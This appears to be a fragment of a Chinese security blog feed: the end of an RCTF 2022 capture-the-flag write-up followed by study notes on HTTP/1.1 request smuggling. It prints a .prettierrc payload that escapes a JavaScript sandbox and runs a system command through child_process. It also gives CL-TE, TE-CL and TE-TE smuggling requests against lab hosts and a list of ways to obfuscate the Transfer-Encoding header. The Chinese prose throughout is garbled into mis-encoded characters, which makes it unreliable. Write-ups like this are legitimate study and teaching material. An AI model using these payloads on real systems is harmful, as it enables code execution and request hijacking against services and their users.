<p><img src="/2022/12/RCTF2022-Writeup/image-20221221212807233.png" alt="image-20221221212807233"></p>
<p>æ‰“å¼€PYZ-00.pyz_extractedæ–‡ä»¶å¤¹ï¼Œæ ¹æ®alien_invasion.pycä¸­çš„æŒ‡ç¤ºpycæ–‡ä»¶ä¸­è·å¾—ç›¸å…³base64ç¼–ç ï¼Œç»Ÿè®¡ä¸ºï¼š</p>
<table>
<thead>
<tr>
<th>å­—ç¬¦ä¸²</th>
<th>è§£ç </th>
<th>pycæ–‡ä»¶</th>
</tr>
</thead>
<tbody>
<tr>
<td>s = bâ€™VTJreE0yNWpNdz09â€™</td>
<td>Si13nc3</td>
<td>alien_invasion.pyc</td>
</tr>
<tr>
<td>a = bâ€™TVRVPQ==â€™</td>
<td>15</td>
<td>alien.pyc</td>
</tr>
<tr>
<td>l = bâ€™Tm5WMA==â€™</td>
<td>6ut</td>
<td>settings.pyc</td>
</tr>
<tr>
<td>m = bâ€™YURBeFpHbHVPUT09   VDI0PQ==    VTJreE0yNVVNWGs9â€™</td>
<td>h01din9_On_Si13nT1y</td>
<td>ship.pyc</td>
</tr>
<tr>
<td>a = bâ€™YmtWMlJYST0=â€™</td>
<td>nEvEr</td>
<td>bullet.pyc</td>
</tr>
<tr>
<td>t = bâ€™ZFhBPQ==â€™</td>
<td>up</td>
<td>game_stats.pyc</td>
</tr>
<tr>
<td>k = bâ€™T1dsMmFXNDU=â€™</td>
<td>9ivin9</td>
<td>button.pyc</td>
</tr>
<tr>
<td>m = bâ€™SmlZPQ==â€™</td>
<td>&amp;&amp;</td>
<td>scoreboard.pyc</td>
</tr>
</tbody>
</table>
<p>ç®€å•æ‹¼æ¥å¯å¾—flagï¼š</p>
<p>RCTF{Si13nc3_15_nEvEr_9ivin9_up_&amp;&amp;_6ut_h01din9_On_Si13nT1y}</p>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="prettieronline"><a class="markdownIt-Anchor" href="#prettieronline"></a> PrettierOnline</h3>
<p>æŸ¥çœ‹<code>.prettierrc</code>çš„é…ç½®æ–‡ä»¶è¯´æ˜<a href="https://prettier.io/docs/en/configuration.html">Configuration File Â· Prettier</a></p>
<p>A file written in JSON or YAML.<code>.prettierrc</code></p>
<p>å³<code>.prettierrc</code>æ”¯æŒJSONå’ŒYAMLä¸¤ç§é…ç½®æ–‡ä»¶ï¼Œå³éœ€è¦æˆ‘æ„å»ºé…ç½®æ–‡ä»¶èƒ½å¤Ÿè¢«è§£ææˆJSæ–‡ä»¶å’ŒYAMLæ–‡ä»¶ã€‚</p>
<p>ç»æµ‹è¯•<img src="/2022/12/RCTF2022-Writeup/image-20221221223518864.png" alt="image-20221221223518864"></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">var</span> <span class="string">T=`</span> <span class="string">`;console.log(&#x27;TWe1v3&#x27;)/*</span></span><br><span class="line"><span class="attr">trailingComma:</span> <span class="string">es5</span></span><br><span class="line"><span class="attr">tabWidth:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">semi:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">singleQuote:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">parser:</span> <span class="string">.prettierrc</span></span><br><span class="line"><span class="comment"># */</span></span><br></pre></td></tr></table></figure>
<p>æ˜¯èƒ½å¤Ÿåœ¨æ§åˆ¶å°ä¸­æ‰“å°å‡ºå­—ç¬¦ï¼Œæ¥ä¸‹æ¥å°±æ˜¯bypass sandbox</p>
<p>æŸ¥é˜… <a href="https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/%E8%8E%B7%E5%BE%97%E6%9C%80%E5%90%8E%E7%9A%84payload">https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/è·å¾—æœ€åçš„payload</a></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">var</span> <span class="string">T=`:</span> <span class="comment">#`;module.exports = ()=&gt;&#123;return global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString()&#125;;/*</span></span><br><span class="line"><span class="attr">trailingComma:</span> <span class="string">es5</span></span><br><span class="line"><span class="attr">tabWidth:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">semi:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">singleQuote:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">parser:</span> <span class="string">.prettierrc</span></span><br><span class="line"><span class="comment"># */</span></span><br></pre></td></tr></table></figure>
<p>RCTF{pReTtiErRc.yAmL.iS.fUnnY}</p>
<h3 id="easy_upload"><a class="markdownIt-Anchor" href="#easy_upload"></a> easy_upload</h3>
]]></content>
      <categories>
        <category>èµ›äº‹Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPè¯·æ±‚èµ°ç§</title>
    <url>/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    <content><![CDATA[<p>è¿™æ˜¯ä¸€äº›å…³äºHTTPè¯·æ±‚èµ°ç§çš„ä¸€äº›å­¦ä¹ ç¬”è®°å’Œæ€»ç»“ï¼Œä¹Ÿæœ‰ä¸€äº›å€Ÿé‰´ï¼ŒCopyå•¦ï¼QwQ~<code>====</code></p>
<span id="more"></span>
<h1 id="æµ…è°ˆhttpè¯·æ±‚èµ°ç§"><a class="markdownIt-Anchor" href="#æµ…è°ˆhttpè¯·æ±‚èµ°ç§"></a> æµ…è°ˆHTTPè¯·æ±‚èµ°ç§</h1>
<hr>
<p>â€‹                                                                                                                                                        <strong>--------------TWe1v3</strong></p>
<p>æœ¬æ–‡ä¸»è¦é’ˆå¯¹HTTP/1.1åè®®çš„è¯·æ±‚èµ°ç§åšä¸€äº›è®²è§£ï¼Œä¸æ¶‰åŠHTTP/2.0ã€HTTP/3.0çš„ç›¸å…³æŠ€æœ¯ã€‚ä¸è¿‡è¿™é‡Œå¯ä»¥è¯´ä¸€ä¸‹HTTPå’ŒHTTPSçš„ä¸€äº›å·®åˆ«ï¼š</p>
<blockquote>
<p><strong>HTTPä¸HTTPSä¸åŒ</strong></p>
<ul>
<li>HTTPSéœ€è¦CAï¼ˆCertificate Authorityï¼Œæ•°å­—è¯ä¹¦è®¤è¯æœºæ„ï¼‰ ç”³è¯·è¯ä¹¦ï¼Œå…è´¹çš„å¾ˆå°‘</li>
<li>HTTPé»˜è®¤80ç«¯å£ï¼›HTTPSé»˜è®¤443ç«¯å£</li>
<li>HTTPä½¿ç”¨httpæ ‡è¯†ç¬¦ï¼›HTTPSä½¿ç”¨httpsæ ‡è¯†ç¬¦</li>
<li>HTTPæ˜¯æ˜æ–‡ä¼ è¾“ï¼›HTTPSæ˜¯åŠ å¯†ä¼ è¾“</li>
<li>HTTPå“åº”æ¯”HTTPSå¿«ï¼Œå› ä¸ºHTTPSè¿˜éœ€è¦TSLæ¡æ‰‹ï¼Œæ‰€ä»¥HTTPSæ›´è€—è´¹æœåŠ¡å™¨èµ„æº</li>
</ul>
</blockquote>
<h2 id="äº§ç”ŸåŸå› "><a class="markdownIt-Anchor" href="#äº§ç”ŸåŸå› "></a> äº§ç”ŸåŸå› </h2>
<p>å½“ä»Šçš„ Web åº”ç”¨ç¨‹åºç»å¸¸åœ¨ç”¨æˆ·å’Œæœ€ç»ˆåº”ç”¨ç¨‹åºé€»è¾‘ä¹‹é—´é‡‡ç”¨ HTTP æœåŠ¡å™¨é“¾ã€‚ç”¨æˆ·å°†è¯·æ±‚å‘é€åˆ° å‰ç«¯æœåŠ¡å™¨ï¼ˆæœ‰æ—¶ç§°ä¸ºè´Ÿè½½å¹³è¡¡å™¨æˆ–åå‘ä»£ç†ï¼‰ï¼Œæ­¤æœåŠ¡å™¨å°†è¯·æ±‚è½¬å‘åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªåç«¯æœåŠ¡å™¨ã€‚ è¿™ç§ç±»å‹çš„æ¶æ„åœ¨ç°ä»£åŸºäºäº‘çš„åº”ç”¨ç¨‹åºä¸­è¶Šæ¥è¶Šæ™®éï¼Œåœ¨æŸäº›æƒ…å†µä¸‹æ˜¯ä¸å¯é¿å…çš„ã€‚</p>
<p>å½“å‰ç«¯æœåŠ¡å™¨å°† HTTP è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨æ—¶ï¼Œå®ƒé€šå¸¸ä¼šé€šè¿‡åŒä¸€åç«¯ç½‘ç»œå‘é€å¤šä¸ªè¯·æ±‚ è¿æ¥ï¼Œå› ä¸ºè¿™æ›´åŠ é«˜æ•ˆå’Œé«˜æ€§èƒ½ã€‚åè®®éå¸¸ç®€å•ï¼šHTTPè¯·æ±‚ä¸€ä¸ªæ¥ä¸€ä¸ªåœ°å‘é€ï¼Œå¹¶ä¸” æ¥æ”¶æœåŠ¡å™¨è§£æ HTTP è¯·æ±‚æ ‡å¤´ï¼Œä»¥ç¡®å®šä¸€ä¸ªè¯·æ±‚çš„ç»“æŸä½ç½®å’Œä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹ä½ç½®ï¼š</p>
<p><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20221126132239777.png" alt="image-20221126132239777"></p>
<p><strong>åŸå› </strong>:å½“ç½‘ç«™ä½¿ç”¨ä¸¤ä¸ªæœåŠ¡å™¨ï¼ˆä¸€ä¸ªå‰ç«¯ï¼Œä¸€ä¸ªåç«¯ï¼‰æ¥å¤„ç†ç”¨æˆ·æ‰€æäº¤çš„æ•°æ®ï¼Œè€Œä¸¤ä¸ªæœåŠ¡å™¨ä¹‹é—´å¯¹HTTP headerçš„å¤„ç†ä¸ä¸€è‡´ï¼Œå°±å¯èƒ½äº§ç”ŸHTTPèµ°ç§é—®é¢˜ã€‚</p>
<blockquote>
<p>ç°åœ¨çš„Webåº”ç”¨ç¨‹åºç»å¸¸åœ¨ç”¨æˆ·å’Œæœ€ç»ˆçš„åº”ç”¨ç¨‹åºä¹‹é—´ä½¿ç”¨HTTPæœåŠ¡å™¨é“¾ã€‚ç”¨æˆ·å°†è¯·æ±‚å‘é€åˆ°å‰ç«¯æœåŠ¡å™¨ï¼ˆæœ‰æ—¶ç§°ä¸ºè´Ÿè½½å¹³è¡¡å™¨æˆ–åå‘ä»£ç†ï¼Œä¹Ÿå¯èƒ½æ˜¯WAFï¼‰ï¼Œå¹¶ä¸”è¯¥æœåŠ¡å™¨å°†è¯·æ±‚è½¬å‘åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªåç«¯æœåŠ¡å™¨ã€‚</p>
</blockquote>
<p><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20221126132324467.png" alt="image-20221126132324467"></p>
<h2 id="å‰ç½®çŸ¥è¯†"><a class="markdownIt-Anchor" href="#å‰ç½®çŸ¥è¯†"></a> å‰ç½®çŸ¥è¯†</h2>
<h3 id="http11çš„ç‰¹æ€§"><a class="markdownIt-Anchor" href="#http11çš„ç‰¹æ€§"></a> HTTP/1.1çš„ç‰¹æ€§</h3>
<h4 id="keep-alive"><a class="markdownIt-Anchor" href="#keep-alive"></a> Keep-Alive</h4>
<p>Keep-Aliveï¼ˆåˆç§°æŒä¹…è¿æ¥ï¼‰ï¼Œåœ¨<code>HTTP/1.1</code>ä¸­ï¼Œé»˜è®¤ä½¿ç”¨å¯ç”¨Keep-Aliveï¼ŒKeep-AliveåŠŸèƒ½ä½¿å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ç«¯çš„è¿æ¥æŒç»­æœ‰æ•ˆï¼ŒåŒä¸€å¯¹å®¢æˆ·/æœåŠ¡å™¨ä¹‹é—´çš„åç»­è¯·æ±‚å’Œå“åº”å¯ä»¥é€šè¿‡è¿™ä¸ªè¿æ¥å‘é€ã€‚</p>
<h4 id="æ”¯æŒpipeline"><a class="markdownIt-Anchor" href="#æ”¯æŒpipeline"></a> æ”¯æŒpipeline</h4>
<p><code>HTTP/1.1</code>å…è®¸åœ¨æŒä¹…è¿æ¥ä¸Šå¯é€‰åœ°ä½¿ç”¨è¯·æ±‚ç®¡é“ï¼ˆæ„å‘³pipelineæ˜¯ä¾èµ–äºæŒä¹…è¿æ¥çš„ï¼Œè€Œä¸æ˜¯ç‹¬ç«‹çš„ï¼‰ã€‚pipelineè¯·æ±‚ç®¡é“å¯ä»¥åœ¨å“åº”åˆ°è¾¾ä¹‹å‰ï¼Œå°†å¤šæ¡è¯·æ±‚æ”¾å…¥é˜Ÿåˆ—ï¼Œä½†å¯¹äºpipelineçš„è¯·æ±‚é¡ºåºå’Œå“åº”é¡ºåºæ˜¯ç›¸å¯¹åº”çš„ã€‚</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721172714.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721172714-166930312604254.png" alt="img"></a></p>
<h3 id="å¯¹äºkeep-aliveæ¨¡å¼å¦‚ä½•åˆ¤æ–­è¯·æ±‚æ‰€å¾—åˆ°çš„å“åº”æ•°æ®å·²ç»æ¥æ”¶å®Œæˆ"><a class="markdownIt-Anchor" href="#å¯¹äºkeep-aliveæ¨¡å¼å¦‚ä½•åˆ¤æ–­è¯·æ±‚æ‰€å¾—åˆ°çš„å“åº”æ•°æ®å·²ç»æ¥æ”¶å®Œæˆ"></a> å¯¹äºKeep-Aliveæ¨¡å¼ï¼Œå¦‚ä½•åˆ¤æ–­è¯·æ±‚æ‰€å¾—åˆ°çš„å“åº”æ•°æ®å·²ç»æ¥æ”¶å®Œæˆ</h3>
<h4 id="conent-length"><a class="markdownIt-Anchor" href="#conent-length"></a> Conent-Length</h4>
<p>Conent-Lengthè¡¨ç¤ºå®ä½“å†…å®¹é•¿åº¦ï¼Œå½“å®¢æˆ·ç«¯å‘æœåŠ¡å™¨è¯·æ±‚ä¸€ä¸ªé™æ€é¡µé¢æˆ–è€…ä¸€å¼ å›¾ç‰‡æ—¶ï¼ŒæœåŠ¡å™¨å¯ä»¥å¾ˆæ¸…æ¥šçš„çŸ¥é“å†…å®¹å¤§å°ï¼Œç„¶åé€šè¿‡Content-lengthæ¶ˆæ¯é¦–éƒ¨å­—æ®µå‘Šè¯‰å®¢æˆ·ç«¯ éœ€è¦æ¥æ”¶å¤šå°‘æ•°æ®ã€‚</p>
<h4 id="transfer-encoding"><a class="markdownIt-Anchor" href="#transfer-encoding"></a> Transfer-Encoding</h4>
<p>åˆ†å—ç¼–ç ï¼Œæ•°æ®åˆ†è§£æˆä¸€ç³»åˆ—æ•°æ®å—ï¼Œå¹¶ä»¥ä¸€ä¸ªæˆ–å¤šä¸ªå—å‘é€ï¼Œè¿™æ ·æœåŠ¡å™¨å¯ä»¥å‘é€æ•°æ®è€Œä¸éœ€è¦é¢„å…ˆçŸ¥é“å‘é€å†…å®¹çš„æ€»å¤§å°ã€‚</p>
<h3 id="åˆ†å—ç¼–ç transfer-encoding-chunked"><a class="markdownIt-Anchor" href="#åˆ†å—ç¼–ç transfer-encoding-chunked"></a> åˆ†å—ç¼–ç ï¼ˆTransfer-Encoding: chunkedï¼‰</h3>
<ol>
<li>åœ¨å¤´éƒ¨åŠ å…¥ Transfer-Encoding: chunked ä¹‹åï¼Œå°±ä»£è¡¨è¿™ä¸ªæŠ¥æ–‡é‡‡ç”¨äº†åˆ†å—ç¼–ç ã€‚è¿™æ—¶ï¼ŒæŠ¥æ–‡ä¸­çš„å®ä½“éœ€è¦æ”¹ä¸ºç”¨ä¸€ç³»åˆ—åˆ†å—æ¥ä¼ è¾“ã€‚</li>
<li>æ¯ä¸ªåˆ†å—åŒ…å«åå…­è¿›åˆ¶çš„é•¿åº¦å€¼å’Œæ•°æ®ï¼Œé•¿åº¦å€¼ç‹¬å ä¸€è¡Œï¼Œé•¿åº¦ä¸åŒ…æ‹¬å®ƒç»“å°¾çš„ CRLF(\r\n)ï¼Œä¹Ÿä¸åŒ…æ‹¬åˆ†å—æ•°æ®ç»“å°¾çš„ CRLF(\r\n)ã€‚</li>
<li>æœ€åä¸€ä¸ªåˆ†å—é•¿åº¦å€¼å¿…é¡»ä¸º 0ï¼Œå¯¹åº”çš„åˆ†å—æ•°æ®æ²¡æœ‰å†…å®¹ï¼Œè¡¨ç¤ºå®ä½“ç»“æŸã€‚</li>
</ol>
<p>ä¾‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25\r\n</span><br><span class="line">This is the data in the first chunk\r\n</span><br><span class="line"></span><br><span class="line">1C\r\n</span><br><span class="line">and this is the second one\r\n</span><br><span class="line"></span><br><span class="line">3\r\n</span><br><span class="line">con\r\n</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<h2 id="å‡ ç§èµ°ç§ç±»å‹"><a class="markdownIt-Anchor" href="#å‡ ç§èµ°ç§ç±»å‹"></a> å‡ ç§èµ°ç§ç±»å‹</h2>
<h3 id="cl-te"><a class="markdownIt-Anchor" href="#cl-te"></a> CL-TE</h3>
<p>å‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthå¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingå¤´ã€‚</p>
<p>å‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œå½“ç¬¬äºŒæ¬¡è¯·æ±‚æ—¶å‡ºç°HTTPæ–¹å¼é”™è¯¯ï¼Œåˆ™å­˜åœ¨èµ°ç§é—®é¢˜ã€‚å®éªŒæˆªå›¾ï¼š</p>
<p><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20221126110216153.png" alt="image-20221126110216153"></p>
<p>åŸå› å°±æ˜¯ç¬¬ä¸€æ¬¡å‰ç«¯æœåŠ¡å™¨è§£ææ—¶ï¼Œä½¿ç”¨Content-Lengthå¤´åˆ¤æ–­ç»“æŸï¼Œæ‰€ä»¥ä¼ ç»™åç«¯æœåŠ¡å™¨çš„æ•°æ®ä¸º</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">\r\n</span></span><br><span class="line"><span class="string">\r\n</span></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
<p>æ€»å…±åŠ èµ·æ¥ä¸º6ï¼Œè€Œåç«¯æœåŠ¡å™¨ä»¥ Transfer-Encoding: chunked åˆ¤æ–­ç»“æŸï¼Œå½“é‡åˆ°</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">\r\n</span></span><br><span class="line"><span class="string">\r\n</span></span><br></pre></td></tr></table></figure>
<p>åœ¨åˆ†å—ä¼ è¾“ä¸­ï¼Œåˆ™ä»£è¡¨ç»“æŸï¼Œè€Œåé¢çš„ <code>G</code> ï¼ŒæœåŠ¡å™¨åˆ¤æ–­æœªå®Œæˆçš„è¯·æ±‚ï¼Œå°†é—ç•™åœ¨ç¼“å­˜ä¸­ï¼Œæ‰€ä»¥å½“ç¬¬äºŒæ¬¡è¯·æ±‚æ—¶ï¼Œæ¥åœ¨äº† <code>G</code> çš„åé¢ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">GPOST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host:  <span class="number">0</span>a<span class="number">10004</span><span class="keyword">c</span><span class="number">04</span>fa<span class="number">2400</span><span class="keyword">c</span><span class="number">0</span><span class="keyword">c</span><span class="number">96</span>f<span class="number">4</span>b<span class="number">00440076</span>.web-security-academy.net</span><br><span class="line">Connection: close</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>è¿™å°±å®Œæˆäº†ä¸€æ¬¡æˆåŠŸçš„è¯·æ±‚èµ°ç§<br>
åœ¨å®é™…æƒ…å†µä¸­æ˜¯ä¸ä¼šå‡ºç°HTTPè¯·æ±‚æ–¹å¼é”™è¯¯çš„ï¼Œå¯ä»¥é€šè¿‡<strong>æ—¶é—´å»¶è¿Ÿ</strong>æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨CL-TEç±»å‹çš„èµ°ç§é—®é¢˜ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="number">1</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">A</span></span></span><br><span class="line"><span class="language-css">X</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœå­˜åœ¨èµ°ç§é—®é¢˜ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚å°±ä¼šæœ‰æ˜æ˜¾çš„å»¶è¿Ÿã€‚</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721193923.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721193923.png" alt="img"></a></p>
<p>æˆ–è€…ä½¿ç”¨ä¸‹é¢çš„payloadè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœå­˜åœ¨èµ°ç§é—®é¢˜ï¼Œåˆ™ä¼š<strong>è¿”å›é”™è¯¯</strong>çš„é¡µé¢ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Foo</span>: x</span></span><br></pre></td></tr></table></figure>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721193726.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721193726.png" alt="img"></a></p>
<ul>
<li>æ³¨æ„<br>
ç”±äºå‰ç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthï¼Œéœ€è¦æŠŠæˆ‘ä»¬æ‰€æœ‰çš„å†…å®¹éƒ½å‘é€åˆ°åç«¯æœåŠ¡å™¨ä¸­å»ï¼Œé‚£è¿™ä¸ªContent-Lengthå¯ä»¥ç”¨Brupsuiteè‡ªåŠ¨è®¡ç®—ã€‚</li>
</ul>
<h3 id="te-cl"><a class="markdownIt-Anchor" href="#te-cl"></a> TE-CL</h3>
<p>å‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingå¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthå¤´ã€‚</p>
<p>ç®€å•åˆ¤æ–­payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">G</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>æ—¶é—´å»¶è¿Ÿpayload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"></span><br><span class="line"><span class="language-tp"><span class="number">0</span></span></span><br><span class="line"><span class="language-tp"></span></span><br><span class="line"><span class="language-tp"><span class="keyword">X</span></span></span><br></pre></td></tr></table></figure>
<p>å“åº”å·®å¼‚payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">34</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">17</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">a</span>=BADHGSGSG</span></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>æ³¨æ„<br>
éœ€è¦æ³¨æ„çš„æ˜¯èµ°ç§çš„è¯·æ±‚ä¸­ï¼ŒContent-Lengthä¸€å®šè¦å°‘äºåé¢è¯·æ±‚ä¸­çš„é•¿åº¦ï¼Œå¦åˆ™åå°ä¼šTimeoutå‡ºç°é”™è¯¯ã€‚</li>
</ul>
<h3 id="te-te"><a class="markdownIt-Anchor" href="#te-te"></a> TE-TE</h3>
<p>å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä»¥æŸç§æ–¹å¼æ··æ·†æ ‡å¤´æ¥è¯±å¯¼å…¶ä¸­ä¸€å°æœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚</p>
<p>æ··æ·†çš„æ–¹å¼ï¼š</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Transfer</span>-Encoding: xchunked</span><br><span class="line"></span><br><span class="line"><span class="built_in">Transfer</span>-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="built_in">Transfer</span>-Encoding: chunked</span><br><span class="line"><span class="built_in">Transfer</span>-Encoding: x</span><br><span class="line"></span><br><span class="line"><span class="built_in">Transfer</span>-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]<span class="built_in">Transfer</span>-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]<span class="built_in">Transfer</span>-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="built_in">Transfer</span>-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
<p>ç®€å•åˆ¤æ–­payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac261f3a1eb0e24580730eed00d70071.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Transfer-encoding</span><span class="punctuation">: </span>cow</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">5c</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GPOST</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">15</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span>=<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br></pre></td></tr></table></figure>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721203309.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721203309.png" alt="img"></a></p>
